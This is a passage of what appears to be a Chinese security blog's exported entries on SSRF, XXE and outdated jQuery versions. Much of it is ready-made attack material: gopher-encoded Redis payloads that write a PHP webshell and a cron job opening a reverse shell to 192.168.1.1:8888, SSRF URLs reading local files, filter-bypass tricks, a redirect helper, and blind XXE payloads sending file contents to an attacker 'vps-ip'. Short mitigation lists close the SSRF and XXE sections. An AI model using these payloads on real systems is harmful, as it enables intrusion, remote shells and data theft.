<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 源指令</span></span><br><span class="line">flushall</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell_sec.php</span><br><span class="line">set &#x27;webshell&#x27; &#x27;&lt;?php phpinfo();?&gt;&#x27;</span><br><span class="line">save</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 转换指令</span></span><br><span class="line">*1</span><br><span class="line"><span class="meta">$</span><span class="bash">8</span></span><br><span class="line">flushall</span><br><span class="line">*4</span><br><span class="line"><span class="meta">$</span><span class="bash">6</span></span><br><span class="line">config</span><br><span class="line"><span class="meta">$</span><span class="bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta">$</span><span class="bash">3</span></span><br><span class="line">dir</span><br><span class="line"><span class="meta">$</span><span class="bash">13</span></span><br><span class="line">/var/www/html</span><br><span class="line">*4</span><br><span class="line"><span class="meta">$</span><span class="bash">6</span></span><br><span class="line">config</span><br><span class="line"><span class="meta">$</span><span class="bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta">$</span><span class="bash">10</span></span><br><span class="line">dbfilename</span><br><span class="line"><span class="meta">$</span><span class="bash">13</span></span><br><span class="line">shell_sec.php</span><br><span class="line">*3</span><br><span class="line"><span class="meta">$</span><span class="bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta">$</span><span class="bash">8</span></span><br><span class="line">webshell</span><br><span class="line"><span class="meta">$</span><span class="bash">18</span></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">*1</span><br><span class="line"><span class="meta">$</span><span class="bash">4</span></span><br><span class="line">save</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 一次编码</span></span><br><span class="line">gopher:/127.0.0.1:6379/_%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%33%0d%0a%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%31%33%0d%0a%73%68%65%6c%6c%5f%73%65%63%2e%70%68%70%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%38%0d%0a%77%65%62%73%68%65%6c%6c%0d%0a%24%31%38%0d%0a%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%3f%3e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a</span><br></pre></td></tr></table></figure>

<p>gopher协议通过redis写入计划任务</p>
<p>在url中需要二次编码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 源指令</span></span><br><span class="line">flushall</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename shellcrontab</span><br><span class="line">set shell &quot;\n\n* * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.1.1/8888 0&gt;&amp;1\n\n&quot;</span><br><span class="line">save</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 转换指令</span></span><br><span class="line">*1</span><br><span class="line"><span class="meta">$</span><span class="bash">8</span></span><br><span class="line">flushall</span><br><span class="line">*4</span><br><span class="line"><span class="meta">$</span><span class="bash">6</span></span><br><span class="line">config</span><br><span class="line"><span class="meta">$</span><span class="bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta">$</span><span class="bash">3</span></span><br><span class="line">dir</span><br><span class="line"><span class="meta">$</span><span class="bash">15</span></span><br><span class="line">/var/spool/cron</span><br><span class="line">*4</span><br><span class="line"><span class="meta">$</span><span class="bash">6</span></span><br><span class="line">config</span><br><span class="line"><span class="meta">$</span><span class="bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta">$</span><span class="bash">10</span></span><br><span class="line">dbfilename</span><br><span class="line"><span class="meta">$</span><span class="bash">4</span></span><br><span class="line">shellcrontab</span><br><span class="line">*3</span><br><span class="line"><span class="meta">$</span><span class="bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta">$</span><span class="bash">5</span></span><br><span class="line">shell</span><br><span class="line"><span class="meta">$</span><span class="bash">60</span></span><br><span class="line">\n\n* * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.1.1/8888 0&gt;&amp;1\n\n</span><br><span class="line">*1</span><br><span class="line"><span class="meta">$</span><span class="bash">4</span></span><br><span class="line">save</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 一次编码</span></span><br><span class="line">gopher:/127.0.0.1:6379/_*1%0D%0A%248%0D%0Aflushall%0D%0A*4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2415%0D%0A/var/spool/cron%0D%0A*4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Ashellcrontab%0D%0A*3%0D%0A%243%0D%0Aset%0D%0A%245%0D%0Ashell%0D%0A%2460%0D%0A%5Cn%5Cn*%20*%20*%20*%20*%20/bin/bash%20-i%3E%26/dev/tcp/192.168.1.1/8888%200%3E%261%5Cn%5Cn%0D%0A*1%0D%0A%244%0D%0Asave</span><br></pre></td></tr></table></figure>



<p>其他协议</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?url=sftp://test.com:9999/</span><br><span class="line">?url=dict://test.com:9999/</span><br><span class="line">?url=tftp://test.com:9999/TESTUDPPACKET/</span><br><span class="line">?url=ldap://test.com:9999/%0astats%0aquit</span><br><span class="line">?url=gopher://test.com:9999/_abc</span><br><span class="line"></span><br><span class="line">test.com:$ nc -lvp 22</span><br></pre></td></tr></table></figure>



<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><ul>
<li>分享：通过URL地址分享网页内容</li>
<li>转码服务（手机适配）</li>
<li>在线翻译（在翻译页面输入URL）</li>
<li>图片的加载与下载</li>
<li>图片，文章收藏功能</li>
<li>未公开的API实现以及其他调用URL的功能</li>
<li>邮件系统</li>
<li>网站采集</li>
<li>编码处理</li>
<li>从URL关键字中寻找<ul>
<li>share</li>
<li>wap</li>
<li>url</li>
<li>link</li>
<li>src</li>
<li>source</li>
<li>target</li>
<li>u</li>
<li>3g</li>
<li>display</li>
<li>sourceURL</li>
<li>image</li>
<li>imageURL</li>
<li>domain</li>
<li>……</li>
</ul>
</li>
</ul>
<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p> 查找访问的资源地址，如果该地址类型为<code>http://xxx.com/x?image=xxx</code></p>
<p>就可能存在SSRF漏洞</p>
<p>将xxx改为内网地址，如果返回1xx,2xx，说明改地址是存在的</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="PHP函数"><a href="#PHP函数" class="headerlink" title="PHP函数"></a>PHP函数</h3><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$content</span>=file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">	<span class="variable">$filename</span>=<span class="string">&#x27;./images/&#x27;</span>.rand().<span class="string">&#x27;.img&#x27;</span>;\</span><br><span class="line">	file_put_contents(<span class="variable">$filename</span>,<span class="variable">$content</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	<span class="variable">$img</span>=<span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$img</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/file_get_contents.php</span><br><span class="line">post</span><br><span class="line">url=http://127.0.0.1:3306</span><br></pre></td></tr></table></figure>



<h4 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"><span class="comment"># fsockopen(主机名称，端口，错误号的接收变量，错误提示的接收变量，超时时间)</span></span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>,intval(<span class="variable">$port</span>),<span class="variable">$errno</span>,<span class="variable">$errstr</span>,<span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    <span class="comment"># fwrite() 函数将内容写入一个打开的文件中</span></span><br><span class="line">    fwrite(<span class="variable">$fp</span>,<span class="variable">$out</span>);</span><br><span class="line">    <span class="comment"># 函数检查是否已到达文件末尾，文件末尾（EOF）</span></span><br><span class="line">    <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>))&#123;</span><br><span class="line">    	<span class="keyword">echo</span> fgets(<span class="variable">$fp</span>,<span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/fsockopen.php?url=127.0.0.1&amp;port=3306</span><br></pre></td></tr></table></figure>



<h4 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h4><p>内网存在文件ssrf.php,代码存在漏洞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$curlobj</span> = curl_init(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">echo</span> curl_exec(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">    curl(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># URL重定向</span><br><span class="line">http://127.0.0.1/ssrf.php?url=http://www.baidu.com</span><br><span class="line">http://127.0.0.1/ssrf.php?url=http://192.168.1.1/xxx</span><br><span class="line"></span><br><span class="line"># 访问内网文件</span><br><span class="line">http://127.0.0.1/ssrf.php?url=file:///C:/windows/win.ini</span><br></pre></td></tr></table></figure>



<h3 id="Java-函数"><a href="#Java-函数" class="headerlink" title="Java 函数"></a>Java 函数</h3><ul>
<li>  HttpClient</li>
<li>  HttpClient.execute</li>
<li>  HttpClient.executeMethod</li>
<li>  HttpURLConnection</li>
<li>  HttpURLConnection.connect</li>
<li>  HttpURLConnection.getInputStream</li>
<li>  URL</li>
<li>  URL.openStream</li>
<li>  HttpServletRequest</li>
<li>  getParameter</li>
<li>  Request</li>
<li>  URLConnection</li>
<li>  okhttp</li>
<li>  BasicHttpEntityEnclosingRequest</li>
<li>  DefaultBHttpClientConnection</li>
<li>  BasicHttpRequest</li>
<li>  URI</li>
</ul>
<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p><strong>@绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.baidu.com@10.10.10.10 相当于 http://10.10.10.10</span><br></pre></td></tr></table></figure>



<p><strong>IP地址转换绕过</strong></p>
<p>例如192.168.0.1这个IP地址我们可以改写成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8进制格式：0300.0250.0.1</span><br><span class="line">16进制格式：0xC0.0xA8.0.1</span><br><span class="line">10进制整数格式：3232235521</span><br><span class="line">16进制整数格式：0xC0A8000</span><br></pre></td></tr></table></figure>



<p><strong>短网址绕过</strong></p>
<p>将网址放入转换短网址的网站进行转换</p>
<p><strong>利用句号绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127。0。0。1 相当于 127.0.0.1</span><br></pre></td></tr></table></figure>



<p><strong>xip.io 绕过</strong></p>
<p>xip.io是指向任意IP的域名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx.192.168.0.1.xip.io/ 相当于 192.168.0.1</span><br></pre></td></tr></table></figure>



<p><strong>加80绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://127.0.0.1:80</span><br></pre></td></tr></table></figure>



<p><strong>[::]绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://[::]:80  相当于 127.0.0.1:80</span><br></pre></td></tr></table></figure>



<p><strong>修改type类型</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改type=file 为 type=url</span><br><span class="line">比如将图片上传处修改，将图片文件改为url，有可能会出发ssrf</span><br></pre></td></tr></table></figure>



<p><strong>符号改写</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>



<p><strong>利用302跳转</strong></p>
<p>把302转换的代码部署到vps上，然后去访问，就可跳转到内网中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$schema</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"><span class="variable">$ip</span>     = <span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span>   = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$port</span>))&#123;  </span><br><span class="line">    header(<span class="string">&quot;Location: <span class="subst">$schema</span>://<span class="subst">$ip</span>/<span class="subst">$query</span>&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: <span class="subst">$schema</span>://<span class="subst">$ip</span>:<span class="subst">$port</span>/<span class="subst">$query</span>&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://xxx.com/ssrf.php?url=http://xx/302.php?s=dict&amp;i=127.0.0.1&amp;port=6379&amp;query=info</span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ul>
<li>对URL中的特殊字符进行过滤</li>
<li>禁止跳转</li>
<li>禁用不需要的协议，仅允许HTTP和HTTPS请求</li>
<li>设置白名单或者限制内网IP</li>
<li>设置端口白名单</li>
<li>判断URL重新向之后的地址</li>
<li>过滤返回的详细信息</li>
</ul>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>SSRF</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE-XML外部实体注入漏洞</title>
    <url>//6faf0d8f29fb.html</url>
    <content><![CDATA[<h2 id="XXE-漏洞介绍"><a href="#XXE-漏洞介绍" class="headerlink" title="XXE 漏洞介绍"></a>XXE 漏洞介绍</h2><p>​        Xml外部实体注入漏洞（XML External Entity Injection）简称XXE，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网探测和攻击，发起dos攻击等危害。<br>​        XML外部实体注入攻击漏洞是在对非安全的外部实体数据进⾏行处理时引发的安全问题,触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件，造成攻击危害。</p>
<h2 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h2><p>XML全称可扩展标记语言。用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line"># dtd文件用来规范XML文件</span><br><span class="line">&lt;!DOCTYPE 班级 SYSTEM &quot;xee.dtd&quot;&gt;</span><br><span class="line">&lt;班级&gt;</span><br><span class="line">	&lt;学生&gt;</span><br><span class="line">        &lt;名字&gt;mz&lt;/名字&gt;</span><br><span class="line">        &lt;年龄&gt;18&lt;/年龄&gt;</span><br><span class="line">        &lt;介绍&gt;js&lt;/介绍&gt;</span><br><span class="line">	&lt;/学生&gt;</span><br><span class="line">	&lt;学生&gt;</span><br><span class="line">        &lt;名字&gt;mz&lt;/名字&gt;</span><br><span class="line">        &lt;年龄&gt;18&lt;/年龄&gt;</span><br><span class="line">        &lt;介绍&gt;js&lt;/介绍&gt;</span><br><span class="line">	&lt;/学生&gt;  </span><br><span class="line">&lt;班级&gt;</span><br></pre></td></tr></table></figure>

<pre><code> 文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">内部声明DTD</span><br><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br><span class="line"></span><br><span class="line">引用外部DTD</span><br><span class="line">&lt;!DOCTYPE 根元素 STSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT 班级 (学生+)&gt;</span><br><span class="line">&lt;!ELEMENT 学生 (名字,年龄,介绍)&gt;</span><br><span class="line">&lt;!ELEMENT 名字 (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT 年龄 (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT 介绍 (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>检测XML是否被成功解析</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">words</span> <span class="meta-string">&quot;Hello XXE !&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;words;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>检测是否支持DTD引用外部实体</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">name</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://localhost/test.xml&quot;</span>&gt;</span>%name;]&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>即使服务器没有使用XML服务，也有可能造成XXE漏洞</strong></p>
<p><strong>所有提交参数可以被修改的时候，都有可能存在XXE漏洞</strong></p>
<p>比如提交json格式的数据，当参数可以被更改，可以修改头部为XML，然后进行注入</p>
<p>将payload加入到http头部中</p>
<p>也可以更改HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">Content-Type:application/xml</span><br><span class="line">Content-Type:text/xml	</span><br></pre></td></tr></table></figure>

<p>读取文件</p>
<p>使用使用php://filter获取目标文件的内容，然后将数据内容为参数值请求外部的http服务器，随后查看http服务器日志就能查看到提取的数据</p>
<p><code>php://filter/read=convert.base64-encode/resource=</code>可以让PHP代码进行编码在浏览器显示，然后再自行解码可以读取文件内容</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt; %xxe; ]&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./target.php&quot;&gt; </span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt; </span><br></pre></td></tr></table></figure>

<p>远程地址访问</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;http://127.0.0.1:3306&quot; &gt; %xxe; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<p>无回显</p>
<p>创建文件test.xml</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert-base64.encode/resource=/flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://vps-ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%dtd;</span><br><span class="line">%xxe;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p>创建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % dtd &quot;&lt;!ENTITY xxe SYSTEM &#x27;http://vps-ip/pass=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure>

<p>让目标访问test.xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;http://127.0.0.1/test.xml&quot; &gt; %xxe; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<p>也可以通过其他方式访问test.xml</p>
<h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2><p>禁止使用外部实体</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>

<p>过滤用户提交的XML数据</p>
<p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>注入漏洞</category>
      </categories>
      <tags>
        <tag>注入漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>jQuery库版本过低</title>
    <url>//c7d50197fdce.html</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer" />

<h2 id="jQuery简介"><a href="#jQuery简介" class="headerlink" title="jQuery简介"></a>jQuery简介</h2><p>　　jQuery是一个快速、简洁的JavaScript框架,是一个丰富的JavaScript代码库。jQuery设计的目的是为了写更少的代码，做更多的事情。它封装JavaScript常用的功能代码，提供一种简便的JavaScript设计模式，优化HTML文档操作、事件处理、动画设计和Ajax交互。</p>
<p>　　在JQuery的诸多发行版本中，存在着DOM-based XSS（跨站脚本攻击的一种)漏洞，易被攻击者利用。漏洞原因在于过滤用户输入数据所使用的正则表达式存在缺陷，可能导致LOCATION.HASH跨站漏洞。这也是最为被大众熟知的jQuery的一个漏洞。</p>
<h2 id="DOM-based-XSS-漏洞"><a href="#DOM-based-XSS-漏洞" class="headerlink" title="DOM-based XSS 漏洞"></a>DOM-based XSS 漏洞</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
<li><p> jquery-1.7.1~1.8.3</p>
</li>
<li><p> jquery-1.6.min.js，jquery-1.6.1.min.js，jquery-1.6.2.min.js</p>
</li>
<li><p> jquery-1.5所有版本</p>
</li>
<li><p> jquery-1.4所有版本</p>
</li>
<li><p> jquery-1.3所有版本</p>
</li>
<li><p> jquery-1.2所有版本</p>
</li>
</ul>
<p>影响版本不全面，建议升级到jquery-3.4.0以上</p>
